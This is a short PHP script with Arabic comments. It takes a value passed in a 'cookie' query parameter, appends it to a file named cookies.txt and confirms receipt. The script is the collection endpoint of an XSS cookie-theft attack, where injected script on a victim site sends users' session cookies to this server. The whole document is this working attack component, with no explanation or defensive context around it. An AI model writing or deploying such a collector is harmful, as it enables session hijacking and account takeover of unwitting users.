<?php
// التحقق من وجود الكوكيز المُرسلة
if (isset($_GET['cookie'])) {
    // تخزين الكوكيز في ملف نصي
    $cookie_data = $_GET['cookie'];
    file_put_contents("cookies.txt", $cookie_data . PHP_EOL, FILE_APPEND);
    echo "Cookie received and stored.";
} else {
    echo "No cookie received.";
}
?>